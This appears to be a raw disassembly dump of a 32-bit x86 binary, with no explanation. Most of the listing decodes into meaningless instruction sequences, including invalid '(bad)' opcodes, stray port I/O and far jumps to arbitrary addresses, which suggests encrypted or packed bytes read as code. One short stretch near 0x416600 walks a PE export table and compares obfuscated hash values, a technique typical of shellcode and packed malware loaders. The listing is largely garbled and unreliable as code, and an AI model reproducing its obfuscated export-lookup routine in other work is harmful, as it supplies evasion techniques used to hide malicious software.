  41616a:	arpl   WORD PTR [esi],bp
  41616c:	popa   
  41616d:	push   eax
  41616e:	je     0x4161d5
  416170:	mov    ebx,0x4d3e3f96
  416175:	(bad)  
  416176:	out    dx,al
  416177:	sbb    al,0xcd
  416179:	or     cl,ch
  41617b:	sub    ah,BYTE PTR [esi-0x3d4880e0]
  416181:	bound  esp,QWORD PTR [ebp+0x4a]
  416184:	inc    eax
  416185:	pushf  
  416186:	pushf  
  416187:	push   eax
  416188:	sub    bl,BYTE PTR [ecx-0x1b]
  41618b:	sub    al,0xea
  41618d:	pop    es
  41618e:	inc    eax
  41618f:	aaa    
  416190:	push   ebx
  416191:	test   al,0x89
  416193:	fbstp  TBYTE PTR [bx+di+0x26]
  416197:	outs   dx,DWORD PTR ds:[esi]
  416198:	fldenv [ecx]
  41619a:	or     eax,0xe5f1c2e6
  41619f:	loopne 0x416202
  4161a1:	das    
  4161a2:	jl     0x416137
  4161a4:	neg    BYTE PTR [edx]
  4161a6:	aad    0x2e
  4161a8:	dec    esp
  4161a9:	mov    dl,0xcd
  4161ab:	int3   
  4161ac:	pop    ss
  4161ad:	shl    dh,cl
  4161af:	jmp    0xdab52cc4
  4161b4:	and    ebx,DWORD PTR [eax]
  4161b6:	enter  0xa8fe,0x6c
  4161ba:	retf   0xf6d6
  4161bd:	inc    ebp
  4161be:	mov    cl,0xae
  4161c0:	in     al,dx
  4161c1:	mov    ds:0x51ad1589,eax
  4161c6:	and    BYTE PTR [eax+0x33b81f2b],bl
  4161cc:	mov    bl,0x69
  4161ce:	in     eax,0x80
  4161d0:	into   
  4161d1:	repz push ss
  4161d3:	dec    ebx
  4161d4:	inc    ebp
  4161d5:	lahf   
  4161d6:	aam    0x64
  4161d8:	mov    dh,0x1a
  4161da:	jo     0x41618f
  4161dc:	loop   0x416186
  4161de:	add    BYTE PTR [ecx-0x55],cl
  4161e1:	and    al,BYTE PTR [ecx]
  4161e3:	outs   dx,DWORD PTR ds:[esi]
  4161e4:	test   BYTE PTR [ebp-0xc],0xf2
  4161e8:	push   edi
  4161e9:	inc    ecx
  4161ea:	fisttp WORD PTR [edi-0x641c45f7]
  4161f0:	inc    ecx
  4161f1:	sub    BYTE PTR [ecx-0x10127f6d],al
  4161f7:	pop    esi
  4161f8:	mov    DWORD PTR [eax-0x11afceb3],ebp
  4161fe:	fadd   QWORD PTR [ebx]
  416200:	or     BYTE PTR [esi],0xe
  416203:	jns    0x41627e
  416205:	leave  
  416206:	pop    esp
  416207:	pushf  
  416208:	pushf  
  416209:	push   ebp
  41620a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41620b:	inc    esi
  41620c:	dec    esp
  41620d:	mov    ch,0x27
  41620f:	xchg   ebx,eax
  416210:	sbb    eax,DWORD PTR [esi-0x342e95b2]
  416216:	(bad)  
  416217:	sub    esi,DWORD PTR [eax]
  416219:	pop    ebp
  41621a:	push   ecx
  41621b:	or     DWORD PTR [edi-0x7bb7acaa],0x991879ce
  416225:	mov    esi,0x592bfc2e
  41622a:	enter  0xb925,0x2d
  41622e:	mov    eax,ds:0xa27a0de5
  416233:	and    eax,0x99ebe036
  416238:	cs mov eax,0x64e4690c
  41623e:	jmp    0x416216
  416240:	xor    al,0x1
  416242:	cmp    ch,0x93
  416245:	jp     0x416240
  416247:	push   esi
  416248:	ss or  eax,0x31e1f00a
  41624e:	enter  0x6cbb,0x41
  416252:	popa   
  416253:	inc    edx
  416254:	lds    esi,FWORD PTR [edi-0x27121d6b]
  41625a:	mov    dl,0xd0
  41625c:	test   ebx,ecx
  41625e:	pushf  
  41625f:	sub    bh,cl
  416261:	dec    ecx
  416262:	dec    ebx
  416263:	loope  0x41620b
  416265:	in     al,0xc3
  416267:	push   es
  416268:	push   es
  416269:	into   
  41626a:	sbb    cl,BYTE PTR [ebx+0x63]
  41626d:	xchg   si,ax
  41626f:	and    al,0xd4
  416271:	setns  BYTE PTR [ebp-0x1dd160d6]
  416278:	iret   
  416279:	sub    BYTE PTR [ecx-0x2a],0x43
  41627d:	shl    BYTE PTR [ebx],0x28
  416280:	mov    edx,0xf71662a9
  416285:	pop    esi
  416286:	sub    al,0x64
  416288:	dec    esp
  416289:	push   edx
  41628a:	mov    dl,0x9e
  41628c:	and    dl,BYTE PTR [esi+esi*8]
  41628f:	push   esp
  416290:	int    0xc0
  416292:	iret   
  416293:	pusha  
  416294:	mov    al,0xc
  416296:	mov    dl,0x24
  416298:	sahf   
  416299:	cs clc 
  41629b:	push   ecx
  41629c:	retf   0xab8c
  41629f:	rcr    BYTE PTR [ebx-0x3cab426e],cl
  4162a5:	loop   0x4162de
  4162a7:	push   edi
  4162a8:	inc    BYTE PTR [ebx+0x59]
  4162ab:	and    BYTE PTR [ebp+eax*1-0x3c78ef3],ch
  4162b2:	and    bh,BYTE PTR [ebp+0x47caa73c]
  4162b8:	loop   0x41624d
  4162ba:	imul   ebp,DWORD PTR [edi+ebx*2-0x199848d0],0xfd47eee2
  4162c5:	xchg   BYTE PTR [ecx],ah
  4162c7:	test   DWORD PTR [edi-0x3a],esi
  4162ca:	cwde   
  4162cb:	cmp    esp,ebp
  4162cd:	mov    eax,ds:0xbea80c27
  4162d2:	and    edx,DWORD PTR [eax+0x50]
  4162d5:	cmp    dl,BYTE PTR [edi-0x55]
  4162d8:	js     0x416323
  4162da:	jmp    0xa778:0x6b91480c
  4162e1:	rcl    DWORD PTR [eax+0x70],1
  4162e4:	pop    ss
  4162e5:	add    BYTE PTR [esi-0x4f99a4f8],dh
  4162eb:	lea    edi,[ecx+esi*4+0x28]
  4162ef:	test   BYTE PTR [ebx+esi*8+0x35],bh
  4162f3:	retf   
  4162f4:	dec    ebp
  4162f5:	and    al,0x47
  4162f7:	stos   BYTE PTR es:[edi],al
  4162f8:	and    esi,DWORD PTR ds:0xb2e62fbc
  4162fe:	xchg   ebp,eax
  4162ff:	and    esp,DWORD PTR ds:0x3538c998
  416305:	lock in al,dx
  416307:	push   ss
  416308:	ja     0x41629e
  41630a:	xchg   esi,eax
  41630b:	pop    ebp
  41630c:	cld    
  41630d:	ins    BYTE PTR es:[edi],dx
  41630e:	sub    ch,BYTE PTR [eax+0xc]
  416311:	xchg   ebp,eax
  416312:	adc    eax,DWORD PTR [edx+edi*8-0x14]
  416316:	jns    0x41630c
  416318:	or     BYTE PTR [esi-0x79],ah
  41631b:	pop    ebp
  41631c:	push   ebx
  41631d:	or     al,0x72
  41631f:	les    eax,FWORD PTR [edx+ecx*8-0x3761c143]
  416326:	call   0x876:0x67b37544
  41632d:	out    0xcd,al
  41632f:	repnz test al,0x3a
  416332:	pop    edi
  416333:	test   al,0x5
  416335:	and    DWORD PTR [ebp-0x781d10e7],edi
  41633b:	das    
  41633c:	clc    
  41633d:	mov    ch,0x94
  41633f:	sahf   
  416340:	jb     0x416324
  416342:	fdiv   DWORD PTR [ebp+0x7]
  416345:	in     al,0x2c
  416347:	adc    ecx,0xf
  41634a:	or     ch,BYTE PTR [ebp+0x388d85db]
  416350:	lods   al,BYTE PTR ds:[esi]
  416351:	dec    ecx
  416352:	jnp    0x41634b
  416354:	scas   eax,DWORD PTR es:[edi]
  416355:	dec    esp
  416356:	lds    ebx,FWORD PTR [edx+0x10705f7f]
  41635c:	mov    dl,0xb9
  41635e:	adc    al,0x11
  416360:	or     eax,edx
  416362:	sub    esi,DWORD PTR [esi-0x33a4dc3a]
  416368:	jge    0x416318
  41636a:	cmovs  edi,DWORD PTR [bp+di]
  41636e:	dec    esp
  41636f:	lods   al,BYTE PTR ds:[esi]
  416370:	fnstenv [edi-0x60]
  416373:	retf   
  416374:	lock adc al,BYTE PTR [esp+ebx*1]
  416378:	sti    
  416379:	sub    eax,ecx
  41637b:	or     BYTE PTR [esi-0x84ab769],cl
  416381:	push   ds
  416382:	and    bl,al
  416384:	pop    esp
  416385:	and    BYTE PTR [ebx+0x1ce37411],bh
  41638b:	aas    
  41638c:	(bad)  [eax-0x25]
  41638f:	push   ss
  416390:	cmp    DWORD PTR [eax+0x36],ebp
  416393:	sbb    al,0x9f
  416395:	addr16 int 0x0
  416398:	add    ebx,DWORD PTR ds:0x50c8c117
  41639e:	lods   eax,DWORD PTR ds:[esi]
  41639f:	adc    BYTE PTR [eax+0x180569cb],ah
  4163a5:	lahf   
  4163a6:	dec    esp
  4163a7:	cmp    esp,DWORD PTR [edi+ecx*1]
  4163aa:	gs mov esp,0x91d8615
  4163b0:	cs xchg ebx,eax
  4163b2:	add    ecx,ebp
  4163b4:	and    ch,BYTE PTR [edi+0xb]
  4163b7:	or     eax,0xfcc13f8c
  4163bc:	mov    ds:0xbf058ddb,al
  4163c1:	add    edx,DWORD PTR [ebx]
  4163c3:	fsubr  DWORD PTR [edi-0x736411e0]
  4163c9:	sbb    BYTE PTR [esi],dl
  4163cb:	cld    
  4163cc:	lahf   
  4163cd:	loope  0x4163ba
  4163cf:	pop    eax
  4163d0:	das    
  4163d1:	call   0xd6b013ba
  4163d6:	arpl   WORD PTR [ecx+0x364e94e9],dx
  4163dc:	rcl    BYTE PTR [ecx],cl
  4163de:	jg     0x416436
  4163e0:	xchg   BYTE PTR [ebp-0xf7ac5f4],ch
  4163e6:	cmp    edx,esi
  4163e8:	(bad)  
  4163e9:	cmp    al,0x80
  4163eb:	push   ebp
  4163ec:	jp     0x416424
  4163ee:	aaa    
  4163ef:	(bad)  ds:0x82ceb174
  4163f5:	or     DWORD PTR [eax],ebp
  4163f7:	pushf  
  4163f8:	cdq    
  4163f9:	push   esi
  4163fa:	xor    al,0x64
  4163fc:	inc    edx
  4163fd:	addr16 push ecx
  4163ff:	mov    eax,0xd25d0560
  416404:	dec    ebp
  416405:	stc    
  416406:	leave  
  416407:	push   ebx
  416408:	jl     0x416447
  41640a:	mov    ebp,0xc33bfe9c
  41640f:	into   
  416410:	retf   0x5375
  416413:	les    esi,FWORD PTR [eax-0x61]
  416416:	je     0x416447
  416418:	(bad)  
  41641a:	dec    edi
  41641b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41641c:	inc    ebp
  41641d:	inc    ecx
  41641e:	pop    ebp
  41641f:	stos   BYTE PTR es:[edi],al
  416420:	cld    
  416421:	pop    ds
  416422:	inc    ecx
  416423:	fadd   DWORD PTR ss:[ecx+0x1c]
  416427:	jae    0x4163df
  416429:	xchg   edx,eax
  41642a:	lahf   
  41642b:	les    edx,FWORD PTR [edi+ecx*1]
  41642e:	xchg   edx,eax
  41642f:	add    al,0x1f
  416431:	jecxz  0x41646a
  416433:	xchg   DWORD PTR [ecx+0x2d90c4f2],eax
  416439:	xchg   ecx,eax
  41643a:	(bad)  
  41643b:	mov    ds:0x4ca156f7,eax
  416440:	mov    al,0xde
  416442:	mov    dh,0x1a
  416444:	imul   eax,DWORD PTR [eax+0x40127328],0x1e
  41644b:	je     0x416412
  41644d:	sti    
  41644e:	call   0x149a:0x5641b8b2
  416455:	mov    ?,WORD PTR [ebx+0x77]
  416458:	bound  ebx,QWORD PTR [ebx-0x369ef52b]
  41645e:	adc    cl,BYTE PTR [eax+0x71]
  416461:	test   DWORD PTR [eax],0xd913f245
  416467:	sub    esp,DWORD PTR [ecx-0x5e8da794]
  41646d:	das    
  41646e:	sbb    BYTE PTR [edx+0x25],dl
  416471:	cmp    DWORD PTR [ecx],ecx
  416473:	push   ds
  416474:	or     eax,0x22861a1e
  416479:	xor    DWORD PTR [edx+ecx*2-0x2d],esp
  41647d:	nop
  41647e:	mov    dh,0xfa
  416480:	inc    esp
  416481:	inc    ebp
  416482:	cmp    esi,DWORD PTR [ebp+0x17]
  416485:	and    al,0x1b
  416487:	push   ds
  416488:	xor    eax,0xe5f647b5
  41648d:	(bad)  
  41648e:	jecxz  0x4164e8
  416490:	mov    BYTE PTR gs:[ecx],0x9e
  416494:	push   cs
  416495:	jno    0x416447
  416497:	xor    eax,DWORD PTR [edx+0x26]
  41649a:	dec    ebx
  41649b:	in     al,0xfd
  41649d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41649e:	les    esp,FWORD PTR [edx+0x31]
  4164a1:	pop    ebp
  4164a2:	or     dh,al
  4164a4:	jmp    0x4164a0
  4164a6:	into   
  4164a7:	cdq    
  4164a8:	push   ecx
  4164a9:	clc    
  4164aa:	push   edx
  4164ab:	push   ds
  4164ac:	(bad)  
  4164ad:	in     al,dx
  4164ae:	xchg   ecx,eax
  4164af:	xor    dh,BYTE PTR [ebp+0x5e]
  4164b2:	xchg   BYTE PTR [esi],ch
  4164b4:	lods   al,BYTE PTR ds:[esi]
  4164b5:	mov    ch,0xbb
  4164b7:	sub    eax,0xd7492d2b
  4164bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164bd:	adc    edi,DWORD PTR [edi]
  4164bf:	dec    esi
  4164c0:	mov    esi,0x125c4738
  4164c5:	int3   
  4164c6:	les    ebp,FWORD PTR fs:[esi+0x41]
  4164ca:	push   ebp
  4164cb:	push   ds
  4164cc:	dec    edx
  4164cd:	test   eax,0x2d1f8a5b
  4164d2:	cli    
  4164d3:	sbb    ebx,ecx
  4164d5:	imul   DWORD PTR [ecx-0x5dc25119]
  4164db:	mov    ch,0xca
  4164dd:	enter  0x8fd1,0xd
  4164e1:	dec    esi
  4164e2:	enter  0x1839,0x1b
  4164e6:	cmp    eax,0xd854afc1
  4164eb:	fs js  0x41651b
  4164ee:	pop    ebx
  4164ef:	aam    0x3d
  4164f1:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4164f3:	pop    esp
  4164f4:	fcom   DWORD PTR cs:[ebx+0x2073b847]
  4164fb:	mov    DWORD PTR [edx-0x1c5ffd0f],eax
  416501:	in     al,0x9f
  416503:	and    al,0x42
  416505:	inc    ebp
  416506:	lahf   
  416507:	pop    ds
  416508:	fsub   st,st(4)
  41650a:	int    0x87
  41650c:	setnp  ah
  41650f:	outs   dx,BYTE PTR ds:[esi]
  416510:	in     al,dx
  416511:	xchg   ebp,eax
  416512:	mov    ?,WORD PTR [esi+0x42304850]
  416518:	sub    BYTE PTR [eax+0x63],al
  41651b:	lock outs dx,DWORD PTR ds:[esi]
  41651d:	mov    eax,0x5e896f06
  416522:	retf   0x107a
  416525:	dec    edi
  416526:	jne    0x416582
  416528:	inc    edi
  416529:	and    al,0xd
  41652b:	and    DWORD PTR [esp+ebp*8+0x78],esp
  41652f:	xor    al,0x97
  416531:	inc    ebx
  416532:	adc    al,0x30
  416534:	add    DWORD PTR [ebx],ecx
  416536:	jbe    0x4164ea
  416538:	sbb    BYTE PTR [edi+0x5],bl
  41653b:	test   BYTE PTR [ecx+0x38fa5366],bl
  416541:	fwait
  416542:	adc    al,0xaa
  416544:	pop    eax
  416545:	fwait
  416546:	xor    eax,0x70f00c83
  41654b:	ins    DWORD PTR es:[edi],dx
  41654c:	fstp   QWORD PTR [edx+edx*4+0x7e]
  416550:	arpl   bx,dx
  416552:	jnp    0x4164d9
  416554:	mov    ecx,0x7d7d6c3f
  416559:	sbb    eax,0xb14f4821
  41655e:	add    BYTE PTR [edx+0x7c40738a],al
  416564:	and    eax,0xa00e1c1f
  416569:	in     al,dx
  41656a:	mov    ch,BYTE PTR [ebx+0x1616ca6c]
  416570:	fsubrp st(4),st
  416572:	sti    
  416573:	cmp    DWORD PTR [ebx],esi
  416575:	lds    ebp,FWORD PTR [esi]
  416577:	jecxz  0x41656d
  416579:	fnstcw WORD PTR [ebx-0x37]
  41657c:	mul    DWORD PTR [edi+0x7f22a2f3]
  416582:	and    al,0xda
  416584:	aas    
  416585:	sub    edx,ebp
  416587:	mov    ebx,0xca27d655
  41658c:	mov    eax,ds:0x884e90f2
  416591:	icebp  
  416592:	rol    BYTE PTR [ebx-0x35],cl
  416595:	sbb    DWORD PTR [edi],ecx
  416597:	jp     0x610cbe08
  41659d:	jp     0x4165f6
  41659f:	in     al,dx
  4165a0:	push   ebx
  4165a1:	aad    0x9e
  4165a3:	mov    ebp,0xcd957c55
  4165a8:	fbstp  TBYTE PTR [ecx-0x4253ebf0]
  4165ae:	add    al,0x42
  4165b0:	sub    ebx,DWORD PTR [edi-0x3e0b8861]
  4165b6:	push   es
  4165b7:	push   ebx
  4165b8:	mov    BYTE PTR [edx],0x1
  4165bb:	loop   0x41659a
  4165bd:	mov    eax,0x848e32c0
  4165c2:	jbe    0x4165f3
  4165c4:	lock stos BYTE PTR es:[edi],al
  4165c6:	repnz outs dx,BYTE PTR ds:[esi]
  4165c8:	iret   
  4165c9:	test   BYTE PTR [esp+ecx*8+0x2a],al
  4165cd:	cmp    eax,0xfd09275b
  4165d2:	sub    BYTE PTR [edx],bh
  4165d4:	retf   0x1cb5
  4165d7:	mov    al,al
  4165d9:	inc    edi
  4165da:	mov    eax,0x5b69aa
  4165df:	xor    al,BYTE PTR ds:0x21766541
  4165e5:	mov    edx,edi
  4165e7:	fsubr  DWORD PTR [edx+0x6]
  4165ea:	ror    BYTE PTR [edi+ebx*1-0x3e123278],cl
  4165f1:	jmp    0x36f8:0x512ada02
  4165f8:	out    0x82,al
  4165fa:	jne    0x416622
  416600:	movsx  di,BYTE PTR [eax]
  416604:	mov    ebx,0x3b4b
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    ch,BYTE PTR [eax-0x3b]
  416674:	xchg   edx,eax
  416675:	jecxz  0x416652
  416677:	and    esp,DWORD PTR [ecx+0x62]
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	fisttp WORD PTR [ecx+ebx*1+0x701cac1f]
  416685:	cmp    BYTE PTR [edx-0x4b],ch
  416688:	jecxz  0x4166e9
  41668a:	adc    DWORD PTR ds:0x8fbba40d,esi
  416690:	adc    DWORD PTR [esi-0xb36d7dd],esi
  416696:	aaa    
  416697:	add    dh,cl
  416699:	jo     0x416689
  41669b:	outs   dx,DWORD PTR ds:[esi]
  41669c:	xor    al,0xbe
  41669e:	mov    esp,0x234a628c
  4166a3:	es cmc 
  4166a5:	hlt    
  4166a6:	xchg   edx,eax
  4166a7:	pop    ds
  4166a8:	popa   
  4166a9:	aam    0xbe
  4166ab:	sbb    DWORD PTR [edi+edi*8+0x3e],0xbf0a8001
  4166b3:	pop    ds
  4166b4:	push   ebp
  4166b5:	dec    esi
  4166b6:	cdq    
  4166b7:	jo     0x4166f4
  4166b9:	jno    0x41671e
  4166bb:	inc    ebx
  4166bc:	push   cs
  4166bd:	add    esi,DWORD PTR [ebp-0x65f0bc6b]
  4166c3:	jp     0x416712
  4166c5:	cmc    
  4166c6:	(bad)
  4166ca:	je     0x416702
  4166cc:	sub    eax,DWORD PTR [edx+edi*8-0x7b]
  4166d0:	mov    dh,0xb5
  4166d2:	ds lahf 
  4166d4:	loopne 0x4166f0
  4166d6:	xor    dh,ch
  4166d8:	les    esp,FWORD PTR [esp+edi*1+0x15]
  4166dc:	sub    al,BYTE PTR [eax-0x60405adb]
  4166e2:	das    
  4166e3:	and    eax,DWORD PTR [ecx-0x7c]
  4166e6:	ror    bh,1
  4166e8:	imul   eax,DWORD PTR [esp+ecx*2+0x1e376d9e],0xc9fec541
  4166f3:	push   es
  4166f4:	mov    esi,0xc219adc0
  4166f9:	dec    esp
  4166fa:	push   ss
  4166fb:	adc    esi,DWORD PTR [edi-0x7d]
  4166fe:	xlat   BYTE PTR ds:[ebx]
  4166ff:	jbe    0x416751
  416701:	inc    ebp
  416702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416703:	call   0x8fd0547c
  416708:	mov    edi,0x7b09333b
  41670d:	jle    0x41671b
  41670f:	dec    ecx
  416710:	mov    esi,DWORD PTR [edx]
  416712:	pop    es
  416713:	add    BYTE PTR [edi+0x1e3d6756],0x48
  41671a:	adc    eax,0xf0b2b6aa
  41671f:	imul   ebp,DWORD PTR [esi],0x9e899ef7
  416725:	xor    eax,0x28e40f8
  41672a:	or     esp,DWORD PTR ds:0x80f2b883
  416730:	fnstenv [eax]
  416732:	xchg   esp,eax
  416733:	inc    ebx
  416734:	and    ebp,ecx
  416736:	lods   eax,DWORD PTR ds:[esi]
  416737:	sub    eax,0xc8a073f9
  41673c:	xchg   DWORD PTR [edx],ebx
  41673e:	into   
  41673f:	mov    esp,0x5af41010
  416744:	icebp  
  416745:	icebp  
  416746:	lods   al,BYTE PTR ds:[esi]
  416747:	jmp    0xa0dc9361
  41674c:	dec    eax
  41674d:	ja     0x41677e
  41674f:	icebp  
  416750:	cdq    
  416751:	dec    ebx
  416752:	das    
  416753:	inc    esi
  416754:	jmp    0x4167bb
  416756:	mov    ds:0x88eb59,al
  41675b:	scas   al,BYTE PTR es:[edi]
  41675c:	jne    0x41677f
  41675e:	stc    
  41675f:	push   ebx
  416760:	jg     0x4167b4
  416762:	jne    0x41677d
  416764:	or     bh,BYTE PTR [ebx-0x2b59ac7b]
  41676a:	cmp    DWORD PTR [esp+eax*1],esp
  41676d:	dec    esi
  41676e:	aaa    
  41676f:	pusha  
  416770:	mov    al,ds:0xe0250dd2
  416775:	(bad)  
  416776:	cld    
  416777:	lea    eax,[ebp-0x13]
  41677a:	add    DWORD PTR [edx],esp
  41677c:	adc    al,0x74
  41677e:	mov    cl,0x3a
  416780:	mov    ds,WORD PTR [ebx-0x6c]
  416783:	test   eax,0xc5e30363
  416788:	dec    edx
  416789:	push   0xffffffe0
  41678b:	daa    
  41678c:	and    eax,0x42971ee3
  416791:	mov    ch,0x61
  416793:	addr16 inc eax
  416795:	cli    
  416796:	outs   dx,BYTE PTR ds:[esi]
  416797:	rol    DWORD PTR [edi],1
  416799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41679a:	outs   dx,BYTE PTR ds:[esi]
  41679b:	jecxz  0x416787
  41679d:	adc    DWORD PTR [edx+ecx*8+0xa9c7f91],esp
  4167a4:	clc    
  4167a5:	sbb    DWORD PTR [edx-0x2381d2df],ebp
  4167ab:	inc    ebp
  4167ac:	stc    
  4167ad:	mov    ecx,0x2fcc37d7
  4167b2:	or     BYTE PTR [esi+0x75],bl
  4167b5:	mov    esp,0x17a94d3
  4167ba:	repz add bh,dh
  4167bd:	outs   dx,DWORD PTR ds:[esi]
  4167be:	push   edi
  4167bf:	mov    BYTE PTR ds:0xe158481e,ah
  4167c5:	in     eax,dx
  4167c6:	jae    0x4167ef
  4167c8:	adc    dh,cl
  4167ca:	xchg   BYTE PTR [esi+esi*1-0x52],ah
  4167ce:	adc    DWORD PTR [edx-0x5c0a67a],ebx
  4167d4:	add    bl,bh
  4167d6:	mov    WORD PTR [ebx+ecx*1-0x2d6d1bfb],cs
  4167dd:	mov    DWORD PTR [ecx],esi
  4167df:	cmp    BYTE PTR [eax+eax*8-0x3d],dh
  4167e3:	ins    BYTE PTR es:[edi],dx
  4167e4:	out    dx,eax
  4167e5:	iret   
  4167e6:	cmp    esi,ecx
  4167e8:	sahf   
  4167e9:	jbe    0x416828
  4167eb:	(bad)  
  4167ec:	pop    edx
  4167ed:	loop   0x4167f5
  4167ef:	out    dx,eax
  4167f0:	outs   dx,BYTE PTR ds:[esi]
  4167f1:	es add al,0xa5
  4167f4:	mov    bl,0x38
  4167f6:	ret    
  4167f7:	jecxz  0x416840
  4167f9:	(bad)
  4167fc:	aam    0x1f
  4167fe:	out    0x39,al
  416800:	xchg   BYTE PTR [ebp-0x72],cl
  416803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416804:	adc    esp,DWORD PTR [edi+0x3eba9853]
  41680a:	(bad)  
  41680b:	(bad)  
  41680c:	mov    esi,edi
  41680e:	int3   
  41680f:	push   ebp
  416810:	clc    
  416811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416812:	das    
  416813:	cmp    esi,DWORD PTR [ecx+0x6f]
  416816:	inc    ebx
  416817:	cmp    al,0xf1
  416819:	cmp    ebx,edx
  41681b:	hlt    
  41681c:	scas   eax,DWORD PTR es:[edi]
  41681d:	sahf   
  41681e:	jmp    0x916695cc
  416823:	mov    cl,BYTE PTR [ebp+0x56eb9bb6]
  416829:	hlt    
  41682a:	out    0x37,al
  41682c:	rcr    DWORD PTR [ebx],0xe6
  41682f:	sbb    esi,DWORD PTR [edi]
  416831:	and    bl,BYTE PTR fs:[ebx-0x60]
  416835:	and    al,0xdf
  416837:	or     ah,BYTE PTR [edi+0xe]
  41683a:	fwait
  41683b:	mov    ?,WORD PTR [edx+0x14]
  41683e:	sti    
  41683f:	dec    esi
  416840:	push   cs
  416841:	bound  esi,QWORD PTR [eax]
  416843:	push   esp
  416844:	add    bl,BYTE PTR [ebx-0x5bb2a466]
  41684a:	ins    BYTE PTR es:[edi],dx
  41684b:	jl     0x416814
  41684d:	test   al,0x5c
  41684f:	or     esi,ebx
  416851:	aam    0x9c
  416853:	clc    
  416854:	jnp    0x41688a
  416856:	pop    esp
  416857:	mov    dl,0x5d
  416859:	dec    edi
  41685a:	cwde   
  41685b:	sub    al,ch
  41685d:	inc    edx
  41685e:	push   edx
  41685f:	push   ss
  416860:	or     eax,0x36b522bd
  416865:	xchg   ebp,eax
  416866:	lock div BYTE PTR [esi+0x3fff81f2]
  41686d:	pushf  
  41686e:	pop    edx
  41686f:	lods   al,BYTE PTR ds:[esi]
  416870:	mov    eax,ds:0x7bfc680c
  416875:	sbb    cl,BYTE PTR [ecx-0x3815457]
  41687b:	add    bl,BYTE PTR [ecx+0x29]
  41687e:	and    al,0x12
  416880:	es out dx,al
  416882:	push   edi
  416883:	cmp    cl,BYTE PTR [eax]
  416885:	xchg   esi,eax
  416886:	in     eax,0x1
  416888:	fucom  st(3)
  41688a:	pop    ebp
  41688b:	scas   al,BYTE PTR es:[edi]
  41688c:	cmp    BYTE PTR [eax+0x205f4228],ch
  416892:	or     bl,BYTE PTR [ecx]
  416894:	cmp    eax,0x8bb027f4
  416899:	shr    ebx,1
  41689b:	sub    edx,ebx
  41689d:	push   0x1f
  41689f:	add    eax,0x4bfd38ff
  4168a4:	out    dx,eax
  4168a5:	sub    ebx,edi
  4168a7:	xor    al,0x3c
  4168a9:	xchg   esi,eax
  4168aa:	inc    esp
  4168ab:	push   cs
  4168ac:	push   es
  4168ad:	pop    es
  4168ae:	pop    ebx
  4168af:	sbb    dh,bh
  4168b1:	jbe    0x41689e
  4168b3:	lahf   
  4168b4:	retf   
  4168b5:	jb     0x416924
  4168b7:	ins    BYTE PTR es:[edi],dx
  4168b8:	jp     0x41692d
  4168ba:	js     0x416886
  4168bc:	dec    ebx
  4168bd:	jb     0x4168c6
  4168bf:	inc    eax
  4168c0:	(bad)  
  4168c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168c2:	sub    DWORD PTR ds:0x6f6f3f1f,esi
  4168c8:	sbb    cl,BYTE PTR [ecx-0x526310aa]
  4168ce:	sub    al,0x61
  4168d0:	jb     0x416888
  4168d2:	rol    DWORD PTR [esi-0x21],cl
  4168d5:	dec    esi
  4168d6:	jbe    0x41688d
  4168d8:	sbb    DWORD PTR [eax],0xfaee8675
  4168de:	dec    edi
  4168df:	add    al,0x99
  4168e1:	pop    edx
  4168e2:	jmp    0xfe53:0x742bd16
  4168e9:	lea    ecx,[esi]
  4168eb:	mov    bl,bl
  4168ed:	sub    eax,0x784b6ac6
  4168f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168f3:	xchg   ebx,eax
  4168f4:	jl     0x41692b
  4168f6:	ja     0x41690a
  4168f8:	dec    esp
  4168f9:	xor    eax,0xde09a489
  4168fe:	cdq    
  4168ff:	es sbb al,0x55
  416902:	inc    ebp
  416903:	jne    0x41693c
  416905:	int3   
  416906:	pusha  
  416907:	xchg   ecx,eax
  416909:	add    BYTE PTR [ebx+0x42],0xa5
  41690d:	fistp  QWORD PTR [eax]
  41690f:	inc    edi
  416910:	xchg   ebx,eax
  416911:	bound  ecx,QWORD PTR [eax-0x27603da1]
  416917:	and    ch,BYTE PTR [eax-0x5b]
  41691a:	test   edx,eax
  41691c:	fnstsw WORD PTR [esi+eax*1]
  41691f:	jmp    0x2048:0xbf9ce8fb
  416926:	setae  bh
  416929:	push   edx
  41692a:	(bad)  
  41692b:	clc    
  41692c:	cmp    ah,BYTE PTR [esi+0x176e73d9]
  416932:	add    bl,cl
  416934:	loop   0x416932
  416936:	sub    esi,DWORD PTR [ebx]
  416938:	in     al,dx
  416939:	pop    esp
  41693a:	std    
  41693b:	pop    ebp
  41693c:	jle    0x416928
  41693e:	popa   
  41693f:	ins    DWORD PTR es:[di],dx
  416941:	mov    bh,0x92
